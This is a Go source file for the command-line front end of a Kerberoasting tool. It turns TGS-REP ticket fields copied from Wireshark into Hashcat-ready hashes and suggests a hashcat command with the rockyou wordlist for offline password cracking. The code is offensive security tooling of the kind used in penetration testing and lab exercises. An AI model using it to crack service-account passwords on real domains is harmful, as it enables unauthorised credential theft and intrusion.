package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/sharquille/kerberoasting/internal/kerberos"

	"github.com/spf13/cobra"
)

// Declare command line interface flag states
var (
	etype    string
	user     string
	domain   string
	spn      string
	cipher   string
	saveFile string
	verbose  bool
	quiet    bool
)

// Configures Cobra's execution attributes.
var rootCmd = &cobra.Command{
	Use:   "gogo",
	Short: "Interactive Kerberoasting hash generator for Hashcat",
	Long: `🎯 Kerberoasting Hash Generator

This utility compiles extracted Ticket Granting Service Reply (TGS-REP) components 
into offline hash formatted text files suitable for direct cracking in Hashcat (e.g. Mode 19700).

Features:
  • Guided command prompt workflow for missing ticket inputs
  • Automatic payload parser (isolating checksum strings from cipher trails)
  • Structural validity check engine
  • Handles AES256, AES128, and RC4 algorithms

Usage:
  gogo                             # Interactive wizard workflow
  gogo --user user1 --domain...    # Direct flags mode (prompts only for missing values)`,

	RunE: func(cmd *cobra.Command, args []string) error {
		if !quiet {
			printBanner()
		}

		// Prompt user interactively for any undefined values
		if err := collectMissingData(); err != nil {
			return err
		}

		// Pack parsed information
		components := kerberos.HashComponents{
			EType:  etype,
			User:   user,
			Domain: domain,
			SPN:    spn,
			Cipher: cipher,
		}

		// Calculate structure split and format mapping
		result, err := kerberos.GenerateHash(components)
		if err != nil {
			return fmt.Errorf("hash generation failure: %w", err)
		}

		// Print outcomes
		if !quiet {
			displayResults(result)
		} else {
			fmt.Println(result.Hash)
		}

		// Write to disk
		if saveFile == "" && !quiet {
			saveFile = promptForSaveFile()
		}

		if saveFile != "" {
			if err := saveHashToFile(result.Hash, saveFile); err != nil {
				return fmt.Errorf("failed writing data to file: %w", err)
			}
			if !quiet {
				fmt.Printf("\n💾 Saved Hash File path: %s\n", saveFile)
			}
		}

		// Suggest quick cracking actions
		if !quiet {
			showHashcatCommand(saveFile, etype)
		}

		return nil
	},
}

// printBanner displays the application banner.
func printBanner() {
	fmt.Println("🎯 Kerberoasting Hash Generator")
	fmt.Println("==================================================")
	fmt.Println("Generate Hashcat-ready hashes from TGS-REP packets")
	fmt.Println()
}

// collectMissingData checks if flags are missing and asks the user to fill them.
func collectMissingData() error {
	scanner := bufio.NewScanner(os.Stdin)

	if !quiet {
		fmt.Println("📋 Enter details below (Defaults are shown in square brackets):")
		fmt.Println()
	}

	// 1. Username
	if user == "" {
		user = promptForString(scanner, "👤 Username (from TGS-REQ cname)", "william.dupont")
	}

	// 2. Domain
	if domain == "" {
		domain = promptForString(scanner, "🏢 Domain Realm", "CATCORP.LOCAL")
	}

	// 3. SPN
	if spn == "" {
		spn = promptForString(scanner, "🎯 Service Principal Name (SPN)", "cifs/DC01.catcorp.local")
	}

	// 4. Etype selector
	if etype == "" {
		if !quiet {
			fmt.Println("\n🔐 Supported Encryption Formats:")
			fmt.Println("   17 = AES128-CTS-HMAC-SHA1-96")
			fmt.Println("   18 = AES256-CTS-HMAC-SHA1-96 (Standard/Most Common)")
			fmt.Println("   23 = RC4-HMAC")
		}
		etype = promptForString(scanner, "   Select encryption type [17/18/23]", "18")
	}

	// 5. Cipher stream hex data
	if cipher == "" {
		if !quiet {
			fmt.Println("\n🔑 Extracting Ticket Cipher Stream:")
			fmt.Println("   1. Locate relevant TGS-REP packet in Wireshark")
			fmt.Println("   2. Expand fields: Kerberos -> tgs-rep -> ticket -> enc-part")
			fmt.Println("   3. Right-click 'cipher' -> Copy -> as Hex Stream")
			fmt.Println()
		}
		fmt.Print("📝 Paste hex cipher stream: ")
		if scanner.Scan() {
			cipher = strings.TrimSpace(scanner.Text())
		}
		if cipher == "" {
			return fmt.Errorf("empty cipher input provided")
		}
	}

	return nil
}

// promptForString provides a CLI input flow returning a fallback default on empty input.
func promptForString(scanner *bufio.Scanner, prompt, defaultValue string) string {
	if defaultValue != "" {
		fmt.Printf("%s [%s]: ", prompt, defaultValue)
	} else {
		fmt.Printf("%s: ", prompt)
	}

	if scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if input == "" && defaultValue != "" {
			return defaultValue
		}
		if input != "" {
			return input
		}
	}
	return defaultValue
}

// promptForSaveFile queries whether the user wants to persist the output to disk.
func promptForSaveFile() string {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("\n📂 Write output to cracking file? [hash.txt]: ")
	if scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			return "hash.txt"
		}
		lowerInput := strings.ToLower(input)
		if lowerInput == "n" || lowerInput == "no" {
			return ""
		}
		return input
	}
	return "hash.txt"
}

// displayResults logs operational output.
func displayResults(result *kerberos.HashResult) {
	fmt.Println("\n🎯 Result Summary")
	fmt.Println(strings.Repeat("-", 50))

	if verbose {
		mode, encType := kerberos.GetHashcatMode(etype)
		fmt.Printf("User:           %s\n", user)
		fmt.Printf("Domain:         %s\n", strings.ToUpper(domain))
		fmt.Printf("SPN:            %s\n", spn)
		fmt.Printf("Encryption:     %s (%s)\n", etype, encType)
		fmt.Printf("Hashcat Mode:   %s\n", mode)
		fmt.Printf("Cipher Length:  %d hex values (%d bytes)\n", result.Length, result.Length/2)
		fmt.Printf("Extracted Tag:  %s\n", result.Checksum)
		fmt.Printf("Hash Validated: %t\n", result.Valid)
		fmt.Println()
	}

	fmt.Printf("📋 Output Hash String:\n\n%s\n", result.Hash)

	if !result.Valid {
		fmt.Println("\n⚠️  WARNING: Structured verification failed. Please check inputs!")
	}
}

// saveHashToFile writes the data safely to local storage.
func saveHashToFile(hash, filename string) error {
	return os.WriteFile(filename, []byte(hash+"\n"), 0644)
}

// showHashcatCommand outputs execution hints.
func showHashcatCommand(filename, etypeStr string) {
	mode, _ := kerberos.GetHashcatMode(etypeStr)
	targetFile := "hash.txt"
	if filename != "" {
		targetFile = filename
	}

	fmt.Println("\n🚀 Execution Hint for offline processing:")
	fmt.Printf("   hashcat -m %s %s /usr/share/wordlists/rockyou.txt -O -w 3\n", mode, targetFile)
}

func init() {
	// Initialize optional flag parameters
	rootCmd.Flags().StringVarP(&user, "user", "u", "", "Username (skips prompt if defined)")
	rootCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain realm (skips prompt if defined)")
	rootCmd.Flags().StringVarP(&spn, "spn", "s", "", "Service Principal Name (skips prompt if defined)")
	rootCmd.Flags().StringVarP(&cipher, "cipher", "c", "", "Cipher stream hex data (skips prompt if defined)")
	rootCmd.Flags().StringVarP(&etype, "etype", "e", "", "Kerberos encryption mode etype indices: 17, 18, 23")
	rootCmd.Flags().StringVarP(&saveFile, "save-file", "o", "", "Destination file to save generated output")
	rootCmd.Flags().BoolVarP(&verbose, "verbose", "v", false, "Print diagnostic metadata output")
	rootCmd.Flags().BoolVarP(&quiet, "quiet", "q", false, "Quiet mode (outputs hash string directly to stdout)")

	// Include helpful usage layouts
	rootCmd.Example = `  # Run in interactive mode:
  gogo

  # Run directly with flags:
  gogo -u william.dupont -d CATCORP.LOCAL -s cifs/DC01.catcorp.local -e 18 -c 168d462f... -o my_hash.txt`
}
